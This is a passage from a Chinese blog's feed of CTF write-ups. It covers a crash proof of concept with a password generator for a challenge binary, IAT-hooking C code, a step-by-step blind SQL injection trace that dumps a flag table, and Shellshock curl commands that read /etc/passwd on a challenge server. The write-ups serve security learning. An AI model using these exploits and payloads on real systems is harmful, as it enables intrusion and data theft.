class="line">            value = ord(self.encode_data[index])</div><div class="line">            if value &gt;= 128:</div><div class="line">                current_bit = 1</div><div class="line">                delta = value - 128</div><div class="line">            else:</div><div class="line">                current_bit = 0</div><div class="line">                delta = value</div><div class="line">            for i in xrange(delta):</div><div class="line">                data_stream.append(current_bit)</div><div class="line"></div><div class="line">        data_stream_len = len(data_stream)</div><div class="line">        char = 0</div><div class="line">        for i in xrange(1, data_stream_len + 1):</div><div class="line">            if i % 8 == 0:</div><div class="line">                char += data_stream[i - 1] &lt;&lt; 7</div><div class="line">                self.decode_data += chr(char)</div><div class="line">                char = 0</div><div class="line">            else:</div><div class="line">                char += (data_stream[i - 1] &lt;&lt; (i % 8 - 1))</div><div class="line">        return self.decode_data</div></pre></td></tr></table></figure></p>
<p>一开始，以为解码后的是字符串，直接打印出来，发现不对，是一张jpg图片：</p>
<p><img src="/images/xd-crack120.jpg" alt=""></p>
<p>得到：<code>key: xidianZ0L4 weLc0me y0u</code></p>
<h2 id="Crack150"><a href="#Crack150" class="headerlink" title="Crack150"></a>Crack150</h2><p>这道是<code>apk</code>文件，直接用<code>apktool</code>反编译，把代码看了个遍，没发现什么，后来看到<code>assert</code>目录下有张图片，用十六进制编辑器打开，找到key和md5字样，但是他们前后都是乱码，把那段内容拷贝出来，尝试各种编码，后来发现是一段中文，我无力吐槽了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">e2 80 9c 6b 65 79 e2 80 9d e7 9a 84 e5 b0 8f e5 86 99 31 36 e4 bd 8d 6d 64 35 e5 8a a0 e5 af 86</div><div class="line">“key”的小写16位md5加密</div></pre></td></tr></table></figure></p>
<p>然后提交：<code>9c15224a8228b9a9</code></p>
<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="Exploit600"><a href="#Exploit600" class="headerlink" title="Exploit600"></a>Exploit600</h2><h3 id="password生成"><a href="#password生成" class="headerlink" title="password生成"></a>password生成</h3><p>把exploitMe.exe拖进IDA，直接F5，找登录验证部分，其验证逻辑如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">char __usercall login&lt;al&gt;(int a1&lt;eax&gt;, int a2&lt;ecx&gt;, signed int a3, signed int a4)</div><div class="line">	&#123;</div><div class="line">	  signed int v4; // edi@5</div><div class="line">	  int v5; // ecx@6</div><div class="line">	  int v6; // esi@6</div><div class="line">	  unsigned __int8 v7; // al@8</div><div class="line">	  char v8; // cl@13</div><div class="line">	  char result; // al@21</div><div class="line">	  int v10; // [sp+0h] [bp-4h]@6</div><div class="line">	</div><div class="line">	  if ( a2 &amp;&amp; a1 &amp;&amp; a3 &gt;= 4 &amp;&amp; a4 &gt; 0 )</div><div class="line">	  &#123;</div><div class="line">	    v4 = 0;</div><div class="line">	    if ( a3 &gt; 0 )</div><div class="line">	    &#123;</div><div class="line">	      v5 = a2 - a1;</div><div class="line">	      v6 = a1;</div><div class="line">	      v10 = v5;</div><div class="line">	      while ( v4 &lt; a4 )</div><div class="line">	      &#123;</div><div class="line">	        v7 = *(_BYTE *)(v5 + v6);</div><div class="line">	        if ( ((char)v7 &lt; 65 || (char)v7 &gt; 90) &amp;&amp; ((char)v7 &lt; 97 || (char)v7 &gt; 122) &amp;&amp; (unsigned __int8)(v7 - 48) &gt; 9u</div><div class="line">	          || ((v8 = *(_BYTE *)v6, *(_BYTE *)v6 &lt; 65) || v8 &gt; 90)</div><div class="line">	          &amp;&amp; (v8 &lt; 97 || v8 &gt; 122)</div><div class="line">	          &amp;&amp; (unsigned __int8)(v8 - 48) &gt; 9u</div><div class="line">	          || v8 != aAbcdefghijklmn[(v7 + ((unsigned int)v7 &gt;&gt; 2)) % 0x3F] )</div><div class="line">	          return 0;</div><div class="line">	        ++v4;</div><div class="line">	        ++v6;</div><div class="line">	        if ( v4 &gt;= a3 )</div><div class="line">	          break;</div><div class="line">	        v5 = v10;</div><div class="line">	      &#125;</div><div class="line">	    &#125;</div><div class="line">	    result = 1;</div><div class="line">	  &#125;</div><div class="line">	  else</div><div class="line">	  &#123;</div><div class="line">	    result = 0;</div><div class="line">	  &#125;</div><div class="line">	  return result;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>大体意思是：取用户名的单个字符，将ASCII值v7加上v7 / 4，然后模0x3F的值作为索引，去aAbcdefghijklmn里找对应值即为密码的对应字符。我用Python实现了下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&apos;</div><div class="line"></div><div class="line"></div><div class="line">def generator_password(username):</div><div class="line">    password = &apos;&apos;</div><div class="line">    for c in username:</div><div class="line">        value = ord(c)</div><div class="line">        index = (value + value / 4) % 0x3f</div><div class="line">        password += chars[index]</div><div class="line">    return password</div></pre></td></tr></table></figure></p>
<h3 id="崩溃bug"><a href="#崩溃bug" class="headerlink" title="崩溃bug"></a>崩溃bug</h3><p>在登录成功后，会将<code>sub_401050</code>函数地址存放在<code>dword_40DA40 + 66</code>处，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">dword_40DA40 = malloc(0x10Cu);</div><div class="line">memset(dword_40DA40, 0, 0x10Cu);</div><div class="line">*((_DWORD *)dword_40DA40 + 66) = sub_401050;</div></pre></td></tr></table></figure></p>
<p>在<code>sub_401050</code>函数中，<code>switch</code>的<code>0x31</code>分支调用，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">case 0x31:</div><div class="line">   (*((void (__stdcall **)(_DWORD, _DWORD))dword_40DA40 + 66))(v4 + 8, v3 - 8);</div><div class="line">   result = 1;</div><div class="line">   break;</div></pre></td></tr></table></figure></p>
<p>但是，在<code>switch</code>的<code>0x20</code>分支，会将接收的数据复制到<code>dword_40DA40</code>中，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">case 0x20:</div><div class="line">    v6 = *(_DWORD *)(v4 + 4);</div><div class="line">    if ( (v6 &amp; 0x80000000u) != 0 || v3 &lt; v6 + 8 || v6 &gt; 0x10C )</div><div class="line">    &#123;</div><div class="line">      result = -2147418114;</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">      v7 = *(_DWORD *)(v4 + 4);</div><div class="line">      v8 = dword_40DA40;</div><div class="line">      *((_DWORD *)dword_40DA40 + 65) = v6;</div><div class="line">      memcpy(v8, (const void *)(v4 + 8), v7);</div><div class="line">      result = 1;</div><div class="line">    &#125;</div><div class="line">    break;</div></pre></td></tr></table></figure></p>
<p>所以，这里先去<code>0x20</code>分支，将<code>dword_40DA40</code>存放的<code>sub_401050</code>地址覆盖，然后去<code>0x31</code>分支，调用，从而导致程序访问无法访问的地址，致使其崩溃，效果如下：</p>
<p><img src="/images/XD-Exploit600.png" alt=""></p>
<p>附上POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">def main():</div><div class="line">    if len(sys.argv) != 4:</div><div class="line">        print &apos;Usage: exploitme host port username&apos;</div><div class="line">        return</div><div class="line"></div><div class="line">    try:</div><div class="line">        host = sys.argv[1]</div><div class="line">        port = int(sys.argv[2])</div><div class="line">        username = sys.argv[3]</div><div class="line">        username_len = len(username)</div><div class="line">        if username_len &lt; 4:</div><div class="line">            print &apos;The least length of username is 4!&apos;</div><div class="line">            return</div><div class="line"></div><div class="line">        st = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">        st.connect((host, port))</div><div class="line"></div><div class="line">        # Send name&apos;s length and password&apos;s length</div><div class="line">        packet = &apos;\x10\x00\x00\x00&apos;</div><div class="line">        packet += (struct.pack(&apos;@h&apos;, username_len) + &apos;\x00\x00&apos;) * 2</div><div class="line">        st.send(packet)</div><div class="line"></div><div class="line">        password = generator_password(username)</div><div class="line"></div><div class="line">        # Send name and password</div><div class="line">        st.send(&apos;\x11\x00\x00\x00&apos; + username + &apos;:&apos; + password)</div><div class="line">        r = st.recv(1024)</div><div class="line">        print r</div><div class="line"></div><div class="line">        # Send bug packet</div><div class="line">        packet = &apos;\x20\x00\x00\x00\x0c\x01\x00\x00&apos; + &apos;A&apos; * 0x10c</div><div class="line">        st.sendall(packet)</div><div class="line"></div><div class="line">        packet = &apos;\x31\x00\x00\x00&apos; + &apos;A&apos; * 12</div><div class="line">        st.sendall(packet)</div><div class="line">        st.close()</div><div class="line">    except TypeError:</div><div class="line">        print &apos;Invalid port!&apos;</div><div class="line">    except IOError:</div><div class="line">        pass</div></pre></td></tr></table></figure></p>
<h1 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h1><h2 id="Coding120"><a href="#Coding120" class="headerlink" title="Coding120"></a>Coding120</h2><p>这个没什么好说的，直接看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">#include&lt;windows.h&gt;</div><div class="line"></div><div class="line">PROC PrcMessage=(PROC)MessageBoxA;</div><div class="line"></div><div class="line">BOOL SetApiAddr(HMODULE hMod, PROC OrgAddr, DWORD *NewAddr, char *DllName);</div><div class="line">typedef int (WINAPI *pFMessageBox)(HWND, LPCSTR lpText, LPCSTR lpCaption, UINT uType);</div><div class="line"></div><div class="line">int WINAPI MyMessageBox(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</div><div class="line">&#123;</div><div class="line">	return ((pFMessageBox)PrcMessage)(hWnd, lpText, lpCaption, uType);</div><div class="line">&#125;</div><div class="line"></div><div class="line">BOOL APIENTRY DllMain(HANDLE hModule,</div><div class="line">					  DWORD  ul_reason_for_call,</div><div class="line">					  LPVOID lpReserved)</div><div class="line">&#123;</div><div class="line">	if(ul_reason_for_call==DLL_PROCESS_ATTACH)</div><div class="line">	&#123;</div><div class="line">		SetApiAddr(::GetModuleHandle(NULL), PrcMessage, (DWORD *)MyMessageBox, &quot;user32.dll&quot;);</div><div class="line">	&#125;</div><div class="line">	return TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//替换IAT表API地址函数</div><div class="line">BOOL SetApiAddr(HMODULE hMod, PROC OrgAddr, DWORD *NewAddr, char *DllName)</div><div class="line">&#123;</div><div class="line">	IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)hMod;</div><div class="line">	IMAGE_OPTIONAL_HEADER * pOptHeader =</div><div class="line">		(IMAGE_OPTIONAL_HEADER *)((BYTE*)hMod + pDosHeader-&gt;e_lfanew + 24);</div><div class="line">	IMAGE_IMPORT_DESCRIPTOR* pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)</div><div class="line">        ((BYTE*)hMod + pOptHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</div><div class="line">	// 在导入表中查找user32.dll模块。因为MessageBoxA函数从user32.dll模块导出</div><div class="line">	while(pImportDesc-&gt;FirstThunk)</div><div class="line">	&#123;</div><div class="line">		char* pszDllName = (char*)((BYTE*)hMod + pImportDesc-&gt;Name);</div><div class="line">		if(lstrcmpiA(pszDllName, DllName) == 0)</div><div class="line">		&#123;</div><div class="line">			break;</div><div class="line">		&#125;</div><div class="line">		pImportDesc++;</div><div class="line">	&#125;</div><div class="line">	if(pImportDesc-&gt;FirstThunk)</div><div class="line">	&#123;</div><div class="line">		// 一个IMAGE_THUNK_DATA结构就是一个双字，它指定了一个导入函数</div><div class="line">		// 调入地址表其实是IMAGE_THUNK_DATA结构的数组，也就是DWORD数组</div><div class="line">		IMAGE_THUNK_DATA* pThunk = (IMAGE_THUNK_DATA*) ((BYTE*)hMod + pImportDesc-&gt;FirstThunk);</div><div class="line">		while(pThunk-&gt;u1.Function)</div><div class="line">		&#123;</div><div class="line">			// lpAddr指向的内存保存了函数的地址</div><div class="line">			DWORD* lpAddr = (DWORD*)&amp;(pThunk-&gt;u1.Function);</div><div class="line">			if(*lpAddr == (DWORD)OrgAddr)</div><div class="line">			&#123;  </div><div class="line">				DWORD dwOldProtect;</div><div class="line">				MEMORY_BASIC_INFORMATION mbi;</div><div class="line">				VirtualQuery(lpAddr, &amp;mbi, sizeof(mbi));</div><div class="line">				VirtualProtect(lpAddr, sizeof(DWORD), PAGE_READWRITE , &amp;dwOldProtect);</div><div class="line">				//修改IAT表项，使其指向我们自定义的函数，</div><div class="line">				::WriteProcessMemory(GetCurrentProcess(), lpAddr, &amp;NewAddr, sizeof(DWORD),NULL);</div><div class="line">				VirtualProtect(lpAddr, sizeof(DWORD), dwOldProtect, 0);</div><div class="line">				return TRUE;</div><div class="line">			&#125;</div><div class="line">			pThunk++;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	return FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int APIENTRY WinMain(HINSTANCE hInstance,</div><div class="line">                     HINSTANCE hPrevInstance,</div><div class="line">                     LPSTR     lpCmdLine,</div><div class="line">                     int       nCmdShow)</div><div class="line">&#123;</div><div class="line">	MyMessageBox(NULL, &quot;Hello World!&quot;, &quot;MessageBox&quot;, MB_OK);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;Web20&quot;&gt;&lt;a href=&quot;#Web20&quot; class=&quot;headerlink&quot; title=&quot;Web20&quot;&gt;&lt;/a&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://blog.watch0ut.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blog.watch0ut.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ISG CTF 2014 Write-up (SQLMAP, Up-to-Date)</title>
    <link href="http://blog.watch0ut.com/2014/09/29/ISG-CTF-2014-Write-up-SQLMAP-Up-to-Date/"/>
    <id>http://blog.watch0ut.com/2014/09/29/ISG-CTF-2014-Write-up-SQLMAP-Up-to-Date/</id>
    <published>2014-09-29T12:46:38.000Z</published>
    <updated>2015-11-19T14:39:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><p>题目很简单，就给了一个数据包：</p>
<p>数据包下载：sqlmap</p>
<p>从数据包看，<code>http://10.0.0.201/message.php?id=``？存在注入点，利用</code>sqlmap<code>进行拖库。前段时间刚好分析过</code>sqlmap`拖库过程，还算比较熟悉。</p>
<p>直接看关键点：</p>
<p>注入成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.0.0.201/message.php?id=1 AND 1922=1922</div></pre></td></tr></table></figure></p>
<p>返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #1 AND 1922=1922: The quick brown fox jumps over the lazy dog</div></pre></td></tr></table></figure></p>
<p>注入失败：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.0.0.201/message.php?id=1 AND 5345=8796</div></pre></td></tr></table></figure></p>
<p>返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #1 AND 5345=8796:</div></pre></td></tr></table></figure></p>
<p>可根据冒号后面是否有内容判断注入的SQL语句是否成功。</p>
<p>这里面值得注意，如果使用<code>wireshark</code>的<code>follow tcp stream</code>是看不到服务返回明文的,因为有<code>gzip</code>编码，直接双击返回的数据帧，<code>line -based text data</code>就可以显示明文了。</p>
<p>PS.当然也有捷径，比如用审计系统跑下包，直接出结果,一般人我不告诉他:D</p>
<p>有了上面基础知识后，很容易分析后面的数据包。</p>
<p>获取数据库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.0.0.201/message.php?id=-2060 UNION ALL SELECT NULL,CONCAT(0x7173636371,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x716f757371)#</div></pre></td></tr></table></figure></p>
<p>返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Message #-2060 UNION ALL SELECT NULL,CONCAT(0x7173636371,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x716f757371)#: qsccqisgqousq</div><div class="line">0x7173636371=qsccq,0x716f757371=qousq，后面同理，得到当前数据库为：isg</div></pre></td></tr></table></figure></p>
<p>后面分别猜表名，列名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-7713 UNION ALL SELECT NULL,CONCAT(0x7173636371,IFNULL(CAST(COUNT(table_name) AS CHAR),0x20),0x716f757371) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x697367)#: qsccq2qousq</div></pre></td></tr></table></figure></p>
<p>存在两个表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-3380 UNION ALL SELECT NULL,(SELECT CONCAT(0x7173636371,IFNULL(CAST(table_name AS CHAR),0x20),0x716f757371) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x697367) LIMIT 0,1)#: qsccqflagsqousq</div></pre></td></tr></table></figure></p>
<p>存在flags表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-8854 UNION ALL SELECT NULL,(SELECT CONCAT(0x7173636371,IFNULL(CAST(table_name AS CHAR),0x20),0x716f757371) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x697367) LIMIT 1,1)#: qsccqmessagesqousq</div></pre></td></tr></table></figure></p>
<p>存在messages表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-8145 UNION ALL SELECT NULL,CONCAT(0x7173636371,IFNULL(CAST(COUNT(*) AS CHAR),0x20),0x716f757371) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6d65737361676573 AND table_schema=0x697367#: qsccq2qousq</div></pre></td></tr></table></figure></p>
<p>messages表有两行记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-2023 UNION ALL SELECT NULL,(SELECT CONCAT(0x7173636371,IFNULL(CAST(column_name AS CHAR),0x20),0x70767673756c,IFNULL(CAST(column_type AS CHAR),0x20),0x716f757371) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6d65737361676573 AND table_schema=0x697367 LIMIT 1,1)#: qsccqvaluepvvsultinytextqousq</div></pre></td></tr></table></figure></p>
<p>messages表列名是value，类型是tinytext<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-8873 UNION ALL SELECT NULL,(SELECT CONCAT(0x7173636371,IFNULL(CAST(`value` AS CHAR),0x20),0x716f757371) FROM isg.messages ORDER BY `value` LIMIT 0,1)#: qsccqThe quick brown fox jumps over the lazy dogqousq</div></pre></td></tr></table></figure></p>
<p>isg.messages中内容为：<code>The quick brown fox jumps over the lazy</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-2064 UNION ALL SELECT NULL,(SELECT CONCAT(0x7173636371,IFNULL(CAST(column_name AS CHAR),0x20),0x70767673756c,IFNULL(CAST(column_type AS CHAR),0x20),0x716f757371) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x666c616773 AND table_schema=0x697367 LIMIT 1,1)#: qsccqvaluepvvsultinytextqousq</div></pre></td></tr></table></figure></p>
<p>flags表列名为value，类型tinytext<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-3413 UNION ALL SELECT NULL,CONCAT(0x7173636371,IFNULL(CAST(COUNT(`value`) AS CHAR),0x20),0x716f757371) FROM isg.flags#: qsccq1qousq</div></pre></td></tr></table></figure></p>
<p>flags有一行记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.0.0.201/message.php?id=-3324 UNION ALL SELECT NULL,(SELECT CONCAT(0x7173636371,IFNULL(CAST(`value` AS CHAR),0x20),0x716f757371) FROM isg.flags ORDER BY `value` LIMIT 0,1)#</div></pre></td></tr></table></figure></p>
<p>直接查询flags表，没有返回结果。后面采用单字符猜测</p>
<p><code>MID()</code>函数取第一个字符，<code>MID(text,1,1)</code>,从第一个字符开始取一个字符</p>
<p><code>ORD</code>把字符转换成<code>ASCII码</code></p>
<p>根据<code>ASCII码</code>比较大小猜测是什么字符，比如下面是猜第一个字符，有<code>The quick brown fox jumps over the lazy dog</code>说明猜对了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;64: The quick brown fox jumps over the lazy dog</div><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;96:</div><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;80:</div><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;72: The quick brown fox jumps over the lazy dog</div><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;76:</div><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;74:</div><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;73:</div></pre></td></tr></table></figure></p>
<p>可以看出第一个字符<code>ASCII码</code>大于72，小于74，结果是73，对应字符是大写的<code>I</code></p>
<p>同理，可得出ASCII为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">73,83,71,123,66,76,105,110,100,95,83,81,108,95,73,110,74,69,99,84,105,48,78,95,68,101,84,69,99,84,69,100,125</div></pre></td></tr></table></figure></p>
<p>对应字符为：<code>ISG{BLind_SQl_InJEcTi0N_DeTEcTEd}</code>。</p>
<h1 id="Up-to-Date"><a href="#Up-to-Date" class="headerlink" title="Up-to-Date"></a>Up-to-Date</h1><p>ISG-2014-UP-TO-DATE</p>
<p>这道题目更新得比较迟，分值只有100，估计是临时出的题目。网站就一个首页，也没别的了</p>
<p>ISG-2014-UP-TO-DATE2</p>
<p>与其他web题目不一样，试了下首页文件，不是<code>index.php,index.htm,index.html,default.php,default.htm,default.html</code></p>
<p>要不题目有意隐藏了首页文件，要么后缀不对。猜测网页可能是其他后缀名，莫非是<code>CGI</code>？结合题目提示“每周更新服务器，以确保flag.txt安全”，让人联想到前几天爆的bash漏洞。详参：<a href="http://coolshell.cn/articles/11973.html" target="_blank" rel="external">http://coolshell.cn/articles/11973.html</a></p>
<p>果然，是这个漏洞！这应该是最快将<code>BASH</code>漏洞作为CTF题目的比赛了吧:D</p>
<p>利用命令查看服务passswd文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -H &apos;b:() &#123; :; &#125;;a=` /bin/cat /etc/passwd `;echo &quot;a=$a&quot;;&apos; http://202.112.26.125:8888/ -I</div></pre></td></tr></table></figure></p>
<p>ISG-2014-bash</p>
<p>使用<code>ls</code>查看目录，最后发现<code>flag.txt</code>在<code>/var/www</code>下面</p>
<p>于是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -H &apos;b:() &#123; :; &#125;;a=` /bin/cat /var/www/flag.txt`;echo &quot;a:$a&quot;;&apos; http://202.112.26.125:8888/ -I</div></pre></td></tr></table></figure></p>
<p><img src="/images/isg-2014-up-to-date.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;SQLMAP&quot;&gt;&lt;a href=&quot;#SQLMAP&quot; class=&quot;headerlink&quot; title=&quot;SQLMAP&quot;&gt;&lt;/a&gt;SQLMAP&lt;/h1&gt;&lt;p&gt;题目很简单，就给了一个数据包：&lt;/p&gt;
&lt;p&gt;数据包下载：sqlmap&lt;/p&gt;
&lt;p&gt;从数据包看，&lt;code
    
    </summary>
    
      <category term="CTF" scheme="http://blog.watch0ut.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blog.watch0ut.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ISG CTF 2014 Write-up (Out of Space, X-Area)</title>
    <link href="http://blog.watch0ut.com/2014/09/29/ISG-CTF-2014-Write-up-Out-of-Space-X-Area/"/>
    <id>http://blog.watch0ut.com/2014/09/29/ISG-CTF-2014-Write-up-Out-of-Space-X-Area/</id>
    <published>2014-09-29T12:38:41.000Z</published>
    <updated>2015-11-19T13:20:57.000Z</updated>
    
